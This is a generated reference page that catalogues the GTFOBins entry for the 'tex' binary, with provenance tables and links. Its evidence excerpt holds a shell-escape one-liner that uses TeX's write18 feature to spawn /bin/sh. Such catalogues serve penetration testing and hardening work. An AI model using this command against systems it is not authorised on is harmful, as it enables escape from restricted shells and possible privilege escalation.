---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tex

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tex` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tex` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for tex covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/tex.md)
- Source verification: [source record](../../sources/gtfobins/tex.md)

## Aliases

- `tex`

## Source Verification

[source record](../../sources/gtfobins/tex.md)

## Evidence Excerpt

```text
_body: ''
_name: tex
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tex
functions:
shell:
- code: tex --shell-escape '\immediate\write18{/bin/sh}'
contexts:
sudo: null
```
